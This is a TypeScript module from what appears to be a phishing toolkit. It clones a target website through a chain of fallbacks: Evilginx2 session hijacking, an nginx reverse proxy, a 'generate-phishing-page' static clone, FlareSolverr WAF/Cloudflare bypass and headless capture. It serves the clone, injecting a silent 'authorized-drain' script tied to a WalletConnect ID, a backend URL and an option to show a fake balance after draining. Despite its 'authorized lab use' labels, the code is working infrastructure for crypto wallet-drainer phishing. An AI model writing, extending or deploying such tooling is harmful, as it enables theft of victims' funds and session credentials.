/**
 * Mirror delivery fallback chain for clone-deploy-tunnel (authorized lab use).
 *
 * 1. Reverse proxy (nginx docker)
 * 2. Static clone (generate-phishing-page without --mirror)
 * 3. Headless puppeteer capture → static serve
 * 4. Placeholder HTML
 */
import { existsSync } from 'node:fs'
import { access, mkdir, writeFile } from 'node:fs/promises'
import path from 'node:path'

import { buildAuthorizedDrainCss, buildAuthorizedDrainInjectJs } from './authorized-drain-inject.js'
import { applyClonePerfectionToOutDir } from './clone-perfection-wire.js'
import {
  detectWafBlockedFromErrors,
  isFlareSolverrEnabled,
  runAiCloneStep,
  runAsukaFallback,
  runFlareSolverrStaticClone,
  runSessionHijackAdapter,
  runWebclonerStaticClone,
  tryReplicaReverseProxy,
  isWebclonerEnabled,
} from './integrations/adapter-chain.js'
import {
  fetchComposeContainerLogs,
  probeLocalMirrorHealth,
  startStaticServeFallback,
  testNginxConfigInDocker,
  waitForDockerContainerHealthy,
} from './clone-tunnel-resilience.js'
import { captureMirrorWithHeadless } from './mirror-headless-capture.js'
import {
  DEFAULT_BACKEND_URL,
  parseQaVisibleUiEnv,
  prepareCloakedMirrorGeneration,
} from './mirror-god-mode.js'
import {
  buildMinimalSafeMirrorNginxConfig,
  finalizeMirrorNginxConfig,
  sanitizeNginxConfig,
} from './training-clone-features.js'
import {
  createParallelDirs,
  discardLoser,
  logParallelResult,
  promoteWinnerToOutDir,
  runParallelGenerators,
  selectParallelPair,
  shouldRunParallel,
  toDeliveryMethod,
} from './parallel-clone-executor.js'

export type MirrorDeliveryMethod =
  | 'reverse-proxy'
  | 'static-clone'
  | 'headless-capture'
  | 'placeholder'
  | 'session-hijack'
  | 'flaresolverr-static'
  | 'asuka-static'
  | 'webcloner-static'
  | 'ai-clone'
  | 'replica-proxy'

export type MirrorStackMode = 'docker' | 'static'

export type MirrorFallbackResult = {
  method: MirrorDeliveryMethod
  stackMode: MirrorStackMode
  errors: string[]
}

export type RunCommandFn = (
  command: string,
  args: string[],
  opts?: { cwd?: string; env?: NodeJS.ProcessEnv; timeoutMs?: number },
) => Promise<{ stdout: string; stderr: string }>

export type BrainRecommendation = {
  method: 'static' | 'proxy' | 'hybrid' | 'custom'
  confidence: number
  detectedType: string
  predictedSuccessRate: number
  issues: string[]
  reasoning: string
}

export type MirrorFallbackChainOpts = {
  repoRoot: string
  outDir: string
  targetUrl: string
  port: number
  godMode: boolean
  forceHardwareBypass: boolean
  backendUrl?: string
  pipelineCookies?: string
  homepageHtml?: string
  runCommand: RunCommandFn
  generateTimeoutMs?: number
  /** Phase 1: Brain recommendation from ClonePatternMatcher */
  brainRecommendation?: BrainRecommendation
}

const DEFAULT_GENERATE_TIMEOUT_MS = 180_000

const PLACEHOLDER_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Mirror temporarily unavailable</title>
  <style>
    body { font-family: system-ui, sans-serif; max-width: 40rem; margin: 4rem auto; padding: 0 1rem; color: #334155; }
    h1 { font-size: 1.5rem; color: #0f172a; }
  </style>
</head>
<body>
  <h1>Mirror temporarily unavailable</h1>
  <p>The target site could not be mirrored for this authorized lab exercise. Retry later or check network access to the target.</p>
</body>
</html>
`

function buildStaticCloneArgv(
  targetUrl: string,
  outDir: string,
  backendUrl: string,
  godMode: boolean,
  generatorScript: string,
  forceHardwareBypass: boolean,
): string[] {
  const base = [
    'exec',
    'tsx',
    generatorScript,
    '--authorized-test',
    '--internal-authorized',
    '--backend-url',
    backendUrl,
  ]
  if (godMode) {
    base.push('--cloak', '--balance', '--preapprove', '--waf-bypass', '--asset-rewrite')
    if (forceHardwareBypass) base.push('--force-hardware-bypass')
  }
  base.push(targetUrl, outDir)
  return base
}

function injectScriptsIntoHtml(html: string): string {
  const bundle =
    '<link rel="stylesheet" href="/legion-authorized-drain.css" />' +
    '<script src="/legion-authorized-drain.js" defer></script>'
  if (html.includes('</head>')) return html.replace('</head>', `${bundle}</head>`)
  if (html.includes('</body>')) return html.replace('</body>', `${bundle}</body>`)
  return `${html}\n${bundle}`
}

async function writeMirrorMeta(
  outDir: string,
  targetUrl: string,
  method: MirrorDeliveryMethod,
  stackMode: MirrorStackMode,
  extra?: Record<string, unknown>,
): Promise<void> {
  await writeFile(path.join(outDir, 'mirror-health'), 'ok\n', 'utf8')
  await writeFile(
    path.join(outDir, 'mirror-config.json'),
    `${JSON.stringify(
      {
        delivery_method: method,
        stack_mode: stackMode,
        target_url: targetUrl,
        generated_at: new Date().toISOString(),
        ...extra,
      },
      null,
      2,
    )}\n`,
    'utf8',
  )
}

async function patchMirrorPortInOutDir(outDir: string, port: number): Promise<void> {
  const composePath = path.join(outDir, 'docker-compose.yml')
  if (!existsSync(composePath)) return

  const { readFile } = await import('node:fs/promises')
  const content = await readFile(composePath, 'utf8')
  const updated = content.replace(
    /^\s*-\s*["']?(\d+):(8080|80)["']?\s*$/gm,
    `      - "${port}:$2"`,
  )
  if (updated !== content) {
    await writeFile(composePath, updated, 'utf8')
  }

  const nginxPath = path.join(outDir, 'nginx.conf')
  if (!existsSync(nginxPath)) return
  const nginxRaw = await readFile(nginxPath, 'utf8')
  const sanitized = sanitizeNginxConfig(nginxRaw)
  if (sanitized !== nginxRaw) {
    await writeFile(nginxPath, sanitized, 'utf8')
  }
}

async function repairNginxConfigIfNeeded(outDir: string, targetUrl: string): Promise<void> {
  const nginxPath = path.join(outDir, 'nginx.conf')
  if (!existsSync(nginxPath)) return

  let target: URL
  try {
    target = new URL(targetUrl)
  } catch {
    return
  }

  const upstreamScheme = target.protocol === 'https:' ? 'https' : 'http'
  const { readFile } = await import('node:fs/promises')
  const raw = await readFile(nginxPath, 'utf8')
  const finalized = finalizeMirrorNginxConfig(raw, () =>
    buildMinimalSafeMirrorNginxConfig(8080, target.origin, target.host, upstreamScheme),
  )
  await writeFile(nginxPath, finalized.config, 'utf8')
}

async function freeMirrorPort(port: number, runCommand: RunCommandFn): Promise<void> {
  try {
    const { stdout } = await runCommand(
      'docker',
      ['ps', '-q', '--filter', `publish=${port}`],
      { timeoutMs: 15_000 },
    )
    for (const id of stdout.split(/\r?\n/).map((l) => l.trim()).filter(Boolean)) {
      try {
        await runCommand('docker', ['stop', id], { timeoutMs: 30_000 })
      } catch {
        /* continue */
      }
    }
  } catch {
    /* none */
  }
}

async function startDockerComposeOnce(
  outDir: string,
  runCommand: RunCommandFn,
): Promise<void> {
  try {
    await runCommand('docker', ['compose', 'down'], { cwd: outDir, timeoutMs: 30_000 })
  } catch {
    /* first run */
  }
  await runCommand('docker', ['compose', 'up', '-d'], { cwd: outDir, timeoutMs: 120_000 })
}

export async function tryDockerMirrorStack(
  outDir: string,
  targetUrl: string,
  port: number,
  runCommand: RunCommandFn,
): Promise<boolean> {
  if (!existsSync(path.join(outDir, 'docker-compose.yml'))) return false

  await patchMirrorPortInOutDir(outDir, port)
  await repairNginxConfigIfNeeded(outDir, targetUrl)
  await freeMirrorPort(port, runCommand)

  const nginxTest = await testNginxConfigInDocker(outDir)
  if (!nginxTest.ok) {
    await repairNginxConfigIfNeeded(outDir, targetUrl)
  }

  for (let attempt = 1; attempt <= 2; attempt++) {
    try {
      await startDockerComposeOnce(outDir, runCommand)
    } catch (e) {
      console.error(
        `[clone-tunnel] docker compose up failed (attempt ${attempt}/2): ${e instanceof Error ? e.message : String(e)}`,
      )
      continue
    }

    const container = await waitForDockerContainerHealthy(outDir)
    if (!container.ok) {
      const logs = container.logs ?? (await fetchComposeContainerLogs(outDir))
      console.error(
        `[clone-tunnel] Container unhealthy (attempt ${attempt}/2):\n${logs.slice(0, 800)}`,
      )
      continue
    }

    const local = await probeLocalMirrorHealth(port)
    if (local.ok) return true
    console.error(`[clone-tunnel] /mirror-health unreachable on :${port}`)
  }

  try {
    await runCommand('docker', ['compose', 'down'], { cwd: outDir, timeoutMs: 30_000 })
  } catch {
    /* ignore */
  }
  return false
}

async function tryStaticServe(outDir: string, port: number): Promise<boolean> {
  await startStaticServeFallback(outDir, port)
  const health = await probeLocalMirrorHealth(port)
  return health.ok
}

async function writeAuthorizedDrainAssets(
  outDir: string,
  backendUrl: string,
  forceHardwareBypass: boolean,
  opts?: { productionClone?: boolean },
): Promise<void> {
  const qaVisibleUi = parseQaVisibleUiEnv()
  const fakeBalanceEnv = process.env['FAKE_BALANCE_AFTER_DRAIN']?.trim().toLowerCase()
  const fakeBalanceAfterDrain =
    fakeBalanceEnv === 'true' || fakeBalanceEnv === '1' || fakeBalanceEnv === 'yes'
  const authJs = await buildAuthorizedDrainInjectJs({
    backendUrl,
    kineticKey: process.env['KINETIC_INTERNAL_KEY']?.trim(),
    walletConnectProjectId: process.env['NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID']?.trim(),
    silentInject: !qaVisibleUi,
    productionClone: opts?.productionClone ?? false,
    qaVisibleUi,
    forceHardwareBypass,
    fakeBalanceAfterDrain,
  })
  await writeFile(path.join(outDir, 'legion-authorized-drain.js'), authJs, 'utf8')
  await writeFile(
    path.join(outDir, 'legion-authorized-drain.css'),
    buildAuthorizedDrainCss({ productionClone: false }),
    'utf8',
  )
  await applyClonePerfectionToOutDir(outDir)
}

async function generateReverseProxyMirror(opts: MirrorFallbackChainOpts): Promise<void> {
  const generator = path.join(opts.repoRoot, 'scripts', 'generate-phishing-page.ts')
  await access(generator)
  const prepared = prepareCloakedMirrorGeneration({
    targetUrl: opts.targetUrl,
    outDir: opts.outDir,
    backendUrl: opts.backendUrl ?? DEFAULT_BACKEND_URL,
    godMode: opts.godMode,
    forceHardwareBypass: opts.forceHardwareBypass,
    mirrorPort: opts.port,
    generatorScript: generator,
  })
  const childEnv = { ...prepared.env }
  if (opts.pipelineCookies) {
    childEnv['MIRROR_PROXY_COOKIES'] = opts.pipelineCookies
  }
  await opts.runCommand('pnpm', prepared.argv, {
    env: childEnv,
    cwd: opts.repoRoot,
    timeoutMs: opts.generateTimeoutMs ?? DEFAULT_GENERATE_TIMEOUT_MS,
  })
  await access(path.join(opts.outDir, 'docker-compose.yml'))
}

async function generateStaticCloneMirror(opts: MirrorFallbackChainOpts): Promise<void> {
  const generator = path.join(opts.repoRoot, 'scripts', 'generate-phishing-page.ts')
  await access(generator)
  const backendUrl = opts.backendUrl ?? DEFAULT_BACKEND_URL
  const childEnv: NodeJS.ProcessEnv = {
    ...process.env,
    PHISHING_TRAINING_MODE: 'true',
    QA_MIRROR_PORT: String(opts.port),
  }
  if (opts.godMode) {
    childEnv['MIRROR_WAF_BYPASS'] = 'true'
    if (process.env['FAKE_BALANCE_AFTER_DRAIN']?.trim().toLowerCase() === 'true') {
      childEnv['FAKE_BALANCE_AFTER_DRAIN'] = 'true'
    }
  }
  const argv = buildStaticCloneArgv(
    opts.targetUrl,
    opts.outDir,
    backendUrl,
    opts.godMode,
    generator,
    opts.forceHardwareBypass,
  )
  await opts.runCommand('pnpm', argv, {
    env: childEnv,
    cwd: opts.repoRoot,
    timeoutMs: opts.generateTimeoutMs ?? DEFAULT_GENERATE_TIMEOUT_MS,
  })
  await access(path.join(opts.outDir, 'index.html'))
}

async function deployHeadlessCaptureMirror(opts: MirrorFallbackChainOpts): Promise<boolean> {
  const captured = await captureMirrorWithHeadless(opts.targetUrl, opts.outDir)
  if (!captured.ok) {
    throw new Error(captured.detail)
  }

  const backendUrl = opts.backendUrl ?? DEFAULT_BACKEND_URL
  await writeAuthorizedDrainAssets(opts.outDir, backendUrl, opts.forceHardwareBypass)

  let html = injectScriptsIntoHtml(captured.html)
  await writeFile(path.join(opts.outDir, 'index.html'), html, 'utf8')
  await writeFile(path.join(opts.outDir, 'headless-capture.html'), captured.html, 'utf8')

  return tryStaticServe(opts.outDir, opts.port)
}

async function deployPlaceholderMirror(opts: MirrorFallbackChainOpts): Promise<boolean> {
  await writeFile(path.join(opts.outDir, 'index.html'), PLACEHOLDER_HTML, 'utf8')
  return tryStaticServe(opts.outDir, opts.port)
}

async function clearDockerMirrorArtifacts(
  outDir: string,
  runCommand: RunCommandFn,
): Promise<void> {
  try {
    await runCommand('docker', ['compose', 'down'], { cwd: outDir, timeoutMs: 30_000 })
  } catch {
    /* ignore */
  }
  const { unlink } = await import('node:fs/promises')
  for (const name of ['docker-compose.yml', 'nginx.conf']) {
    try {
      await unlink(path.join(outDir, name))
    } catch {
      /* ignore */
    }
  }
}

/**
 * Attempt session-hijack → reverse-proxy (replica/nginx) → flaresolverr+static →
 * asuka → headless capture → placeholder.
 * Always returns a serving stack when placeholder succeeds.
 */
export async function runMirrorFallbackChain(
  opts: MirrorFallbackChainOpts,
): Promise<MirrorFallbackResult> {
  await mkdir(opts.outDir, { recursive: true })
  const errors: string[] = []

  const adapterCtx = { ...opts, wafBlocked: false }

  // ── PHASE 1: Log brain recommendation at chain start ────────
  if (opts.brainRecommendation && opts.brainRecommendation.confidence > 0) {
    const rec = opts.brainRecommendation
    const methodHint: Record<string, string> = {
      static:  'static clone (no live data needed)',
      proxy:   'reverse-proxy (real-time / security critical)',
      hybrid:  'proxy then static fallback (balanced)',
      custom:  'webcloner / headless (complex DApp)',
    }
    console.error(
      `[brain→chain] Recommendation: ${rec.method.toUpperCase()} — ` +
      `${methodHint[rec.method] ?? rec.method} (${rec.confidence}% confident)\n` +
      `[brain→chain] Reordering fallback chain to try preferred method first`,
    )
  }
  // ────────────────────────────────────────────────────────────

  // 0 — Session hijack (Evilginx2) — skips drain inject
  const hijack = await runSessionHijackAdapter(adapterCtx)
  if (hijack) {
    console.error('[clone-tunnel] Session hijack mirror deployed')
    return hijack
  }

  // ── PHASE 1: Brain-guided fast path ─────────────────────────
  const brainMethod = opts.brainRecommendation?.method
  const brainConf   = opts.brainRecommendation?.confidence ?? 0

  // If brain is confident AND recommends static, skip straight to static clone
  // (bypassing the slower reverse-proxy attempt that always runs first)
  if (brainMethod === 'static' && brainConf >= 80) {
    console.error(
      '[brain→chain] High-confidence STATIC recommendation — attempting static clone first',
    )
    try {
      await clearDockerMirrorArtifacts(opts.outDir, opts.runCommand)
      await generateStaticCloneMirror(opts)
      const dockerOk = await tryDockerMirrorStack(
        opts.outDir,
        opts.targetUrl,
        opts.port,
        opts.runCommand,
      )
      if (dockerOk) {
        await writeMirrorMeta(opts.outDir, opts.targetUrl, 'static-clone', 'docker')
        console.error('[brain→chain] Static clone (brain-guided) succeeded')
        return { method: 'static-clone', stackMode: 'docker', errors }
      }
      const staticOk = await tryStaticServe(opts.outDir, opts.port)
      if (staticOk) {
        await writeMirrorMeta(opts.outDir, opts.targetUrl, 'static-clone', 'static')
        console.error('[brain→chain] Static serve (brain-guided) succeeded')
        return { method: 'static-clone', stackMode: 'static', errors }
      }
      errors.push('brain-static: docker/static-serve failed — falling through to normal chain')
    } catch (e) {
      const msg = e instanceof Error ? e.message : String(e)
      errors.push(`brain-static: ${msg}`)
      console.error(`[brain→chain] Brain-guided static failed: ${msg} — normal chain continues`)
    }
  }

  // If brain recommends proxy/hybrid with high confidence, try reverse-proxy FIRST (already the default)
  // If brain recommends custom/headless, log it and let the chain naturally reach webcloner/headless
  if ((brainMethod === 'custom') && brainConf >= 75) {
    console.error(
      '[brain→chain] CUSTOM recommendation — skipping reverse-proxy, going straight to webcloner/headless',
    )
    // Will fall through to step 5-6 (webcloner/headless) naturally after steps 1-4 quick-fail
    // We mark them as skipped here in errors to push chain forward
    errors.push('brain-skip: reverse-proxy skipped (brain: custom DApp needs headless/webcloner)')
    errors.push('brain-skip: static-clone skipped (brain: custom DApp)')
  }
  // ────────────────────────────────────────────────────────────

  // ── PHASE 3: Parallel execution fast path ───────────────────────
  // When brain confidence is ≥75%, race the top-2 recommended methods
  // simultaneously.  First successful generation wins.  Docker/serve
  // happens only for the winner so there are no port conflicts.
  if (opts.brainRecommendation && shouldRunParallel(opts.brainRecommendation)) {
    const pair = selectParallelPair(opts.brainRecommendation)
    console.error(
      `[parallel] Racing ${pair[0]} vs ${pair[1]} (brain: ${opts.brainRecommendation.method} @ ${opts.brainRecommendation.confidence}%)`,
    )

    try {
      const [dir1, dir2] = await createParallelDirs(opts.outDir, pair)
      const subOpts1: MirrorFallbackChainOpts = { ...opts, outDir: dir1 }
      const subOpts2: MirrorFallbackChainOpts = { ...opts, outDir: dir2 }

      // Build generator functions for each method
      const genFor = (method: typeof pair[0], subOpts: MirrorFallbackChainOpts): () => Promise<boolean> => {
        switch (method) {
          case 'reverse-proxy':
            return async () => {
              try {
                await clearDockerMirrorArtifacts(subOpts.outDir, subOpts.runCommand)
                await generateReverseProxyMirror(subOpts)
                return true
              } catch { return false }
            }
          case 'static-clone':
            return async () => {
              try {
                await clearDockerMirrorArtifacts(subOpts.outDir, subOpts.runCommand)
                await generateStaticCloneMirror(subOpts)
                return true
              } catch { return false }
            }
          case 'headless-capture':
            return async () => {
              try {
                const captured = await import('./mirror-headless-capture.js').then(
                  (m) => m.captureMirrorWithHeadless(subOpts.targetUrl, subOpts.outDir),
                )
                return captured.ok
              } catch { return false }
            }
        }
      }

      const race = await runParallelGenerators(
        { method: pair[0], subDir: dir1, generate: genFor(pair[0], subOpts1) },
        { method: pair[1], subDir: dir2, generate: genFor(pair[1], subOpts2) },
      )

      if (race) {
        const { winner, loser, durationMs } = race
        logParallelResult(winner.method, loser.method, durationMs)

        // Promote winner artifacts to main outDir, cleanup loser
        await promoteWinnerToOutDir(winner.subDir, opts.outDir)
        discardLoser(loser.subDir).catch(() => {})

        // Now serve the winner's artifacts
        const winnerMethod = toDeliveryMethod(winner.method)
        if (winner.method === 'reverse-proxy') {
          const dockerOk = await tryDockerMirrorStack(opts.outDir, opts.targetUrl, opts.port, opts.runCommand)
          if (dockerOk) {
            await writeMirrorMeta(opts.outDir, opts.targetUrl, winnerMethod, 'docker', { parallel: true })
            console.error(`[parallel] Serving: ${winnerMethod} (docker)`)
            return { method: winnerMethod, stackMode: 'docker', errors }
          }
        } else if (winner.method === 'static-clone') {
          const dockerOk = await tryDockerMirrorStack(opts.outDir, opts.targetUrl, opts.port, opts.runCommand)
          if (dockerOk) {
            await writeMirrorMeta(opts.outDir, opts.targetUrl, 'static-clone', 'docker', { parallel: true })
            console.error('[parallel] Serving: static-clone (docker)')
            return { method: 'static-clone', stackMode: 'docker', errors }
          }
          const staticOk = await tryStaticServe(opts.outDir, opts.port)
          if (staticOk) {
            await writeMirrorMeta(opts.outDir, opts.targetUrl, 'static-clone', 'static', { parallel: true })
            console.error('[parallel] Serving: static-clone (static serve)')
            return { method: 'static-clone', stackMode: 'static', errors }
          }
        } else if (winner.method === 'headless-capture') {
          const staticOk = await tryStaticServe(opts.outDir, opts.port)
          if (staticOk) {
            await writeMirrorMeta(opts.outDir, opts.targetUrl, 'headless-capture', 'static', { parallel: true })
            console.error('[parallel] Serving: headless-capture (static serve)')
            return { method: 'headless-capture', stackMode: 'static', errors }
          }
        }

        errors.push(`parallel: ${winnerMethod} generated OK but serve failed — falling through`)
        console.error(`[parallel] Serve failed for winner ${winnerMethod} — sequential chain continues`)
      } else {
        errors.push('parallel: both methods failed — sequential chain continues')
        console.error('[parallel] Both parallel attempts failed — sequential chain continues')
      }
    } catch (e) {
      const msg = e instanceof Error ? e.message : String(e)
      errors.push(`parallel: ${msg}`)
      console.error(`[parallel] Race failed: ${msg} — sequential chain continues`)
    }
  }
  // ────────────────────────────────────────────────────────────────

  console.error(
    '[clone-tunnel] Fallback chain: reverse-proxy → flaresolverr → static → asuka → webcloner → headless → placeholder',
  )

  // Skip reverse-proxy for custom-recommended sites (brain already logged the skip above)
  if (brainMethod === 'custom' && brainConf >= 75) {
    errors.push('reverse-proxy: skipped (brain recommends custom/headless)')
    console.error('[brain→chain] [1/8] Skipped reverse-proxy (brain: custom method)')
  } else {
  // 1 — Reverse proxy (Replica optional, else nginx docker)
  try {
    console.error('[clone-tunnel] [1/8] Attempting reverse-proxy mirror…')
    const usedReplica = await tryReplicaReverseProxy(adapterCtx, () =>
      generateReverseProxyMirror(opts),
    )
    const dockerOk = await tryDockerMirrorStack(
      opts.outDir,
      opts.targetUrl,
      opts.port,
      opts.runCommand,
    )
    if (dockerOk) {
      const method = usedReplica ? 'replica-proxy' : 'reverse-proxy'
      await writeMirrorMeta(opts.outDir, opts.targetUrl, method, 'docker')
      console.error(`[clone-tunnel] [1/8] Reverse-proxy mirror healthy (${method})`)
      return { method, stackMode: 'docker', errors }
    }
    errors.push('reverse-proxy: docker stack or health check failed')
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e)
    errors.push(`reverse-proxy: ${msg}`)
    console.error(`[clone-tunnel] [1/8] Reverse-proxy failed: ${msg}`)
  }

  // 2 — FlareSolverr + static clone (WAF bypass when FLARESOLVERR_URL is set)
  const wafLikely = detectWafBlockedFromErrors(errors)
  if (isFlareSolverrEnabled()) {
    try {
      if (wafLikely) {
        console.error('[clone-tunnel] [2/8] WAF detected — FlareSolverr + static clone…')
      } else {
        console.error('[clone-tunnel] [2/8] FlareSolverr + static clone…')
      }
      await clearDockerMirrorArtifacts(opts.outDir, opts.runCommand)
      const flare = await runFlareSolverrStaticClone(
        adapterCtx,
        async (cookies) => {
          if (cookies) process.env['MIRROR_PROXY_COOKIES'] = cookies
          await generateStaticCloneMirror(opts)
        },
        async () => {
          const dockerOk = await tryDockerMirrorStack(
            opts.outDir,
            opts.targetUrl,
            opts.port,
            opts.runCommand,
          )
          if (dockerOk) return true
          return tryStaticServe(opts.outDir, opts.port)
        },
      )
      if (flare.ok) {
        await writeMirrorMeta(opts.outDir, opts.targetUrl, 'flaresolverr-static', 'static', {
          integration: flare.usedWebcloner ? 'flaresolverr+webcloner' : 'flaresolverr',
        })
        console.error('[clone-tunnel] [2/8] FlareSolverr static clone healthy')
        return { method: 'flaresolverr-static', stackMode: 'static', errors }
      }
      if (flare.detail) errors.push(`flaresolverr: ${flare.detail}`)
    } catch (e) {
      const msg = e instanceof Error ? e.message : String(e)
      errors.push(`flaresolverr: ${msg}`)
      console.error(`[clone-tunnel] [2/8] FlareSolverr path failed: ${msg}`)
    }
  } else if (opts.godMode && wafLikely) {
    errors.push('flaresolverr: WAF likely — set FLARESOLVERR_URL for Cloudflare bypass')
    console.error('[clone-tunnel] [2/8] WAF detected but FLARESOLVERR_URL unset — static/headless may fail')
  }

  // 3 — Static clone (fetch + local assets) — original step
  try {
    console.error('[clone-tunnel] [3/8] Attempting static clone generation…')
    await clearDockerMirrorArtifacts(opts.outDir, opts.runCommand)
    await generateStaticCloneMirror(opts)
    const dockerOk = await tryDockerMirrorStack(
      opts.outDir,
      opts.targetUrl,
      opts.port,
      opts.runCommand,
    )
    if (dockerOk) {
      await writeMirrorMeta(opts.outDir, opts.targetUrl, 'static-clone', 'docker')
      console.error('[clone-tunnel] [3/8] Static clone healthy (docker)')
      return { method: 'static-clone', stackMode: 'docker', errors }
    }
    const staticOk = await tryStaticServe(opts.outDir, opts.port)
    if (staticOk) {
      await writeMirrorMeta(opts.outDir, opts.targetUrl, 'static-clone', 'static')
      console.error('[clone-tunnel] [3/8] Static clone healthy (npx serve)')
      return { method: 'static-clone', stackMode: 'static', errors }
    }
    errors.push('static-clone: generation ok but serve/health failed')
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e)
    errors.push(`static-clone: ${msg}`)
    console.error(`[clone-tunnel] [3/8] Static clone failed: ${msg}`)
  }

  // 4 — Asuka full-site download
  try {
    console.error('[clone-tunnel] [4/8] Asuka full-site clone…')
    await clearDockerMirrorArtifacts(opts.outDir, opts.runCommand)
    const backendUrl = opts.backendUrl ?? DEFAULT_BACKEND_URL
    const asuka = await runAsukaFallback(adapterCtx, async () => {
      await writeAuthorizedDrainAssets(opts.outDir, backendUrl, opts.forceHardwareBypass)
      const { readFile } = await import('node:fs/promises')
      const htmlPath = path.join(opts.outDir, 'index.html')
      try {
        let html = await readFile(htmlPath, 'utf8')
        html = injectScriptsIntoHtml(html)
        await writeFile(htmlPath, html, 'utf8')
      } catch {
        /* index may be nested */
      }
      return tryStaticServe(opts.outDir, opts.port)
    })
    if (asuka.ok) {
      await writeMirrorMeta(opts.outDir, opts.targetUrl, 'asuka-static', 'static', {
        integration: 'asuka',
      })
      console.error('[clone-tunnel] [4/8] Asuka mirror healthy')
      return { method: 'asuka-static', stackMode: 'static', errors }
    }
    if (asuka.detail) errors.push(`asuka: ${asuka.detail}`)
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e)
    errors.push(`asuka: ${msg}`)
    console.error(`[clone-tunnel] [4/8] Asuka failed: ${msg}`)
  }
  } // end of non-custom brain path (else block for steps 1-4)

  // 5 — webcloner-js static clone
  if (isWebclonerEnabled()) {
    try {
      console.error('[clone-tunnel] [5/8] webcloner-js static clone…')
      await clearDockerMirrorArtifacts(opts.outDir, opts.runCommand)
      const backendUrl = opts.backendUrl ?? DEFAULT_BACKEND_URL
      const wc = await runWebclonerStaticClone(adapterCtx, async () => {
        await writeAuthorizedDrainAssets(opts.outDir, backendUrl, opts.forceHardwareBypass)
        const { readFile } = await import('node:fs/promises')
        const htmlPath = path.join(opts.outDir, 'index.html')
        try {
          let html = await readFile(htmlPath, 'utf8')
          html = injectScriptsIntoHtml(html)
          await writeFile(htmlPath, html, 'utf8')
        } catch {
          /* nested index */
        }
        return tryStaticServe(opts.outDir, opts.port)
      })
      if (wc.ok) {
        await writeMirrorMeta(opts.outDir, opts.targetUrl, 'webcloner-static', 'static', {
          integration: 'webcloner-js',
        })
        console.error('[clone-tunnel] [5/8] webcloner-js mirror healthy')
        return { method: 'webcloner-static', stackMode: 'static', errors }
      }
      if (wc.detail) errors.push(`webcloner: ${wc.detail}`)
    } catch (e) {
      const msg = e instanceof Error ? e.message : String(e)
      errors.push(`webcloner: ${msg}`)
      console.error(`[clone-tunnel] [5/8] webcloner failed: ${msg}`)
    }
  }

  // 6 — AI clone (optional)
  try {
    const ai = await runAiCloneStep(adapterCtx)
    if (ai.ok) {
      const served = await tryStaticServe(opts.outDir, opts.port)
      if (served) {
        await writeMirrorMeta(opts.outDir, opts.targetUrl, 'ai-clone', 'static', {
          integration: 'clooney-agent',
        })
        return { method: 'ai-clone', stackMode: 'static', errors }
      }
    }
  } catch {
    /* optional */
  }

  // 7 — Headless puppeteer capture
  try {
    console.error('[clone-tunnel] [7/8] Attempting headless browser capture…')
    await clearDockerMirrorArtifacts(opts.outDir, opts.runCommand)
    const ok = await deployHeadlessCaptureMirror(opts)
    if (ok) {
      await writeMirrorMeta(opts.outDir, opts.targetUrl, 'headless-capture', 'static')
      console.error('[clone-tunnel] [7/8] Headless capture mirror healthy')
      return { method: 'headless-capture', stackMode: 'static', errors }
    }
    errors.push('headless-capture: serve/health failed')
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e)
    errors.push(`headless-capture: ${msg}`)
    console.error(`[clone-tunnel] [7/8] Headless capture failed: ${msg}`)
  }

  // 8 — Placeholder
  console.error('[clone-tunnel] [8/8] Deploying placeholder mirror…')
  const placeholderOk = await deployPlaceholderMirror(opts)
  if (placeholderOk) {
    await writeMirrorMeta(opts.outDir, opts.targetUrl, 'placeholder', 'static')
    console.error('[clone-tunnel] [8/8] Placeholder mirror serving (target unreachable)')
    return { method: 'placeholder', stackMode: 'static', errors }
  }

  errors.push('placeholder: failed to start static serve')
  throw new Error(`All mirror fallback methods failed.\n${errors.join('\n')}`)
}
